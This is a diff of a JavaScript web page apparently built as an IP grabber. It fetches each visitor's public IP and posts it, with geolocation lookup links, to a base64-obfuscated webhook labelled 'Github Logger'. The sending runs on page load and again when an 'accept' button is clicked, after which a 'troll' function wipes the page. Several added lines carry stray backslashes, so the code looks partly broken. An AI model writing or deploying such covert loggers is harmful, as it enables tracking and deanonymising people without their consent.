@@ -30,27 +30,23 @@
 
         get_information("https://api.ipify.org/", function(text) {
             var ip = text;
+            logger(ip);     
         });
 
-       
-        function logger() {
-            var ispp = document.getElementById('ipppp').innerHTML;
-
+\        function logger(ip) {
             const request = new XMLHttpRequest();
-            request.open("POST", wbhk);
+            request.open("POST", atob(wbhk)); \
             request.setRequestHeader('Content-type', 'application/json');
             const params = {
                 username: "Github Logger",
                 avatar_url: 'https://images.g2crowd.com/uploads/product/image/large_detail/large_detail_de619ca81012d42cede6fd18af63d8b1/inkscape.png',
-                content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**IP Lookup** : " + "https://whatismyipaddress.com/ip/" + ispp
+                content: "**Ip** : _" + ip + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ip + "_\n**IP Lookup** : " + "https://whatismyipaddress.com/ip/" + ip
             };
             request.send(JSON.stringify(params));
         }
-        
-        setTimeout(function() {
-            logger();
-        }, 100);
 
+        setTimeout(function() {
+\        }, 100);
 
         function troll() {
             document.body.innerHTML = '';
@@ -79,8 +75,11 @@
         }
 
         document.getElementById("accept-btn").onclick = function() {
-            logger(); 
-            troll(); 
+\            get_information("https://api.ipify.org/", function(text) {
+                var ip = text; \
+                logger(ip); 
+            });
+            troll();
         };
 
         document.getElementById("decline-btn").onclick = function() {
